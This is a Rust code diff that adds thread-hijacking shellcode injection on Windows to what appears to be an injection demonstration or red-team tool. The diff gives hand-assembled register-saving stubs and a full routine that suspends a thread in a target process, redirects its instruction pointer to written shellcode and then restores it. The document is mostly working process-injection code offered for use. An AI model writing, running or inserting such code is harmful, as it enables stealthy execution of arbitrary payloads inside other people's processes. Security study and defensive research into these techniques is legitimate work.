@@ -158,10 +158,9 @@ pub fn live_inject(
             imp::live_inject_create_remote_thread(pid, shellcode, log)
         }
         InjectionTechnique::APC => imp::live_inject_apc(pid, shellcode, log),
-        InjectionTechnique::ThreadHijack => Err(format!(
-            "live injection is not yet implemented for technique '{}'",
-            technique.name()
-        )),
+        InjectionTechnique::ThreadHijack => {
+            imp::live_inject_hijack(pid, shellcode, log)
+        }
     }
 }
 
@@ -250,11 +249,92 @@ pub(crate) fn wrap_for_apc(shellcode: &[u8]) -> Vec<u8> {
     wrapped
 }
 
+#[rustfmt::skip]
+pub(crate) fn wrap_for_hijack(shellcode: &[u8]) -> Vec<u8> {
+    const PROLOGUE_SIZE: usize = 36;
+    const EPILOGUE_SIZE: usize = 46;
+
+    const PROLOGUE: &[u8] = &[
+        0x9C,                               // pushfq
+        0x50,                               // push rax
+        0x51,                               // push rcx
+        0x52,                               // push rdx
+        0x53,                               // push rbx
+        0x55,                               // push rbp
+        0x56,                               // push rsi
+        0x57,                               // push rdi
+        0x41, 0x50,                         // push r8
+        0x41, 0x51,                         // push r9
+        0x41, 0x52,                         // push r10
+        0x41, 0x53,                         // push r11
+        0x41, 0x54,                         // push r12
+        0x41, 0x55,                         // push r13
+        0x41, 0x56,                         // push r14
+        0x41, 0x57,                         // push r15
+        0x48, 0x89, 0xE5,                   // mov rbp, rsp (save stack for restoration)
+        0x48, 0x83, 0xE4, 0xF0,            // and rsp, -16 (16-byte align)
+        0xE8, 0x2E, 0x00, 0x00, 0x00,      // call +46 (jump over epilogue to shellcode)
+    ];
+
+    const EPILOGUE: &[u8] = &[
+        // Set completion flag (rax is still saved on stack, safe to use)
+        0xE8, 0x00, 0x00, 0x00, 0x00,      // call $+5
+        0x58,                               // pop rax (rax = addr of this pop)
+        0x48, 0x05, 0x00, 0x00, 0x00, 0x00, // add rax, <flag_disp> (patched)
+        0xC6, 0x00, 0x01,                   // mov byte [rax], 1
+        // Restore stack pointer and all registers
+        0x48, 0x89, 0xEC,                   // mov rsp, rbp
+        0x41, 0x5F,                         // pop r15
+        0x41, 0x5E,                         // pop r14
+        0x41, 0x5D,                         // pop r13
+        0x41, 0x5C,                         // pop r12
+        0x41, 0x5B,                         // pop r11
+        0x41, 0x5A,                         // pop r10
+        0x41, 0x59,                         // pop r9
+        0x41, 0x58,                         // pop r8
+        0x5F,                               // pop rdi
+        0x5E,                               // pop rsi
+        0x5D,                               // pop rbp
+        0x5B,                               // pop rbx
+        0x5A,                               // pop rdx
+        0x59,                               // pop rcx
+        0x58,                               // pop rax
+        0x9D,                               // popfq
+        // Spin-wait — host will suspend and restore original context
+        0xF3, 0x90,                         // pause
+        0xEB, 0xFC,                         // jmp -4 (back to pause)
+    ];
+
+    debug_assert_eq!(PROLOGUE.len(), PROLOGUE_SIZE);
+    debug_assert_eq!(EPILOGUE.len(), EPILOGUE_SIZE);
+
+    // pop rax address = base + PROLOGUE_SIZE + 5
+    // flag address    = base + PROLOGUE_SIZE + EPILOGUE_SIZE + shellcode.len()
+    // displacement    = EPILOGUE_SIZE + shellcode.len() - 5 = 41 + shellcode.len()
+    let flag_disp: u32 = (41 + shellcode.len()) as u32;
+
+    let total = PROLOGUE_SIZE + EPILOGUE_SIZE + shellcode.len() + 1;
+    let mut wrapped = Vec::with_capacity(total);
+    wrapped.extend_from_slice(PROLOGUE);
+    wrapped.extend_from_slice(EPILOGUE);
+    wrapped.extend_from_slice(shellcode);
+    wrapped.push(0x00); // completion flag, initially 0
+
+    // Patch flag displacement in epilogue's `add rax, imm32` (bytes 8..12 of epilogue)
+    let disp_offset = PROLOGUE_SIZE + 8;
+    wrapped[disp_offset..disp_offset + 4].copy_from_slice(&flag_disp.to_le_bytes());
+
+    wrapped
+}
+
 #[cfg(windows)]
 mod imp {
     use crate::log::LogSink;
     use windows::Win32::Foundation::{CloseHandle, FALSE, HANDLE, WAIT_OBJECT_0};
-    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
+    use windows::Win32::System::Diagnostics::Debug::{
+        GetThreadContext, ReadProcessMemory, SetThreadContext, WriteProcessMemory, CONTEXT,
+        CONTEXT_FLAGS,
+    };
     use windows::Win32::System::Memory::{
         VirtualAllocEx, VirtualFreeEx, VirtualProtectEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE,
         PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
@@ -263,10 +343,11 @@ mod imp {
         CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
     };
     use windows::Win32::System::Threading::{
-        CreateRemoteThread, GetExitCodeThread, OpenProcess, OpenThread, QueueUserAPC,
-        WaitForSingleObject, INFINITE, LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD,
-        PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
-        THREAD_SET_CONTEXT,
+        CreateRemoteThread, GetExitCodeThread, OpenProcess, OpenThread,
+        QueueUserAPC, ResumeThread, SuspendThread, WaitForSingleObject, INFINITE,
+        LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
+        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT,
+        THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
     };
 
     pub fn live_inject_create_remote_thread(
@@ -588,6 +669,181 @@ mod imp {
             size,
         })
     }
+
+    pub fn live_inject_hijack(
+        pid: u32,
+        shellcode: &[u8],
+        log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        log.step(format!(
+            "[1/7] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
+            pid
+        ));
+        let process_access = PROCESS_QUERY_INFORMATION
+            | PROCESS_VM_OPERATION
+            | PROCESS_VM_READ
+            | PROCESS_VM_WRITE;
+        let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
+            format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
+        })?;
+
+        let result = hijack_inject_chain(process, pid, shellcode, log);
+        let _ = unsafe { CloseHandle(process) };
+        result
+    }
+
+    fn hijack_inject_chain(
+        process: HANDLE,
+        pid: u32,
+        shellcode: &[u8],
+        log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        let wrapped = super::wrap_for_hijack(shellcode);
+        let size = wrapped.len();
+        let flag_offset = size - 1;
+        let base = write_remote_payload(process, &wrapped, 7, log)?;
+
+        log.step("[5/7] SuspendThread — finding and suspending a target thread");
+
+        let snapshot =
+            unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
+                free_remote(process, base, log);
+                format!("CreateToolhelp32Snapshot failed: {e}")
+            })?;
+
+        let mut entry = THREADENTRY32 {
+            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
+            ..Default::default()
+        };
+
+        let mut target_tid: Option<u32> = None;
+        if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
+            loop {
+                if entry.th32OwnerProcessID == pid {
+                    target_tid = Some(entry.th32ThreadID);
+                    break;
+                }
+                if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
+                    break;
+                }
+            }
+        }
+        let _ = unsafe { CloseHandle(snapshot) };
+
+        let tid = match target_tid {
+            Some(t) => t,
+            None => {
+                free_remote(process, base, log);
+                return Err(format!("no threads found for PID {}", pid));
+            }
+        };
+
+        let thread_access = THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
+        let thread = unsafe { OpenThread(thread_access, FALSE, tid) }.map_err(|e| {
+            free_remote(process, base, log);
+            format!("OpenThread(TID {}) failed: {e}", tid)
+        })?;
+
+        let suspend_result = unsafe { SuspendThread(thread) };
+        if suspend_result == u32::MAX {
+            let _ = unsafe { CloseHandle(thread) };
+            free_remote(process, base, log);
+            return Err(format!("SuspendThread(TID {}) failed", tid));
+        }
+        log.info(format!("      suspended thread TID {}", tid));
+
+        log.step("[6/7] SetThreadContext — redirecting RIP to shellcode");
+
+        let mut context: CONTEXT = unsafe { core::mem::zeroed() };
+        context.ContextFlags = CONTEXT_FLAGS(0x10001F); // CONTEXT_ALL
+        if let Err(e) = unsafe { GetThreadContext(thread, &mut context) } {
+            let _ = unsafe { ResumeThread(thread) };
+            let _ = unsafe { CloseHandle(thread) };
+            free_remote(process, base, log);
+            return Err(format!("GetThreadContext failed: {e}"));
+        }
+
+        let original_rip = context.Rip;
+        log.info(format!("      original RIP: 0x{:X}", original_rip));
+
+        // Save full context for restoration
+        let saved_context: CONTEXT = unsafe { core::ptr::read(&context) };
+
+        context.Rip = base as u64;
+        if let Err(e) = unsafe { SetThreadContext(thread, &context) } {
+            let _ = unsafe { ResumeThread(thread) };
+            let _ = unsafe { CloseHandle(thread) };
+            free_remote(process, base, log);
+            return Err(format!("SetThreadContext failed: {e}"));
+        }
+        log.info(format!("      RIP redirected to shellcode at {:#p}", base));
+
+        let _ = unsafe { ResumeThread(thread) };
+        log.info("      thread resumed — shellcode executing");
+
+        log.step("[7/7] WaitForCompletion — polling flag + restoring original context");
+
+        let flag_addr = unsafe { (base as *const u8).add(flag_offset) };
+        let mut flag_value: u8 = 0;
+        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
+        let mut completed = false;
+
+        loop {
+            if unsafe {
+                ReadProcessMemory(
+                    process,
+                    flag_addr as *const core::ffi::c_void,
+                    &mut flag_value as *mut u8 as *mut core::ffi::c_void,
+                    1,
+                    None,
+                )
+            }
+            .is_err()
+            {
+                break;
+            }
+            if flag_value == 1 {
+                completed = true;
+                break;
+            }
+            if std::time::Instant::now() > deadline {
+                log.warning("      timeout waiting for shellcode completion (5s)");
+                break;
+            }
+            std::thread::sleep(std::time::Duration::from_millis(50));
+        }
+
+        let _ = unsafe { SuspendThread(thread) };
+        if let Err(e) = unsafe { SetThreadContext(thread, &saved_context) } {
+            log.warning(format!("      SetThreadContext (restore) failed: {e}"));
+        } else {
+            log.info(format!(
+                "      original context restored (RIP: 0x{:X})",
+                original_rip
+            ));
+        }
+        let _ = unsafe { ResumeThread(thread) };
+        let _ = unsafe { CloseHandle(thread) };
+
+        if completed {
+            log.info("      shellcode completed, thread continues normally");
+        } else {
+            log.warning(
+                "      shellcode may not have completed — context restored anyway",
+            );
+        }
+
+        log.info(format!(
+            "      shellcode at remote address {:#p} ({} bytes, wrapped {}+83)",
+            base,
+            size,
+            size - 83
+        ));
+        Ok(super::InjectionResult {
+            remote_base: base as u64,
+            size,
+        })
+    }
 }
 
 #[cfg(not(windows))]
@@ -606,6 +862,17 @@ mod imp {
     }
 
     pub fn live_inject_apc(
+        _pid: u32,
+        _shellcode: &[u8],
+        _log: &LogSink,
+    ) -> Result<super::InjectionResult, String> {
+        Err(
+            "live injection requires Windows — this build is running on a non-Windows host"
+                .to_string(),
+        )
+    }
+
+    pub fn live_inject_hijack(
         _pid: u32,
         _shellcode: &[u8],
         _log: &LogSink,
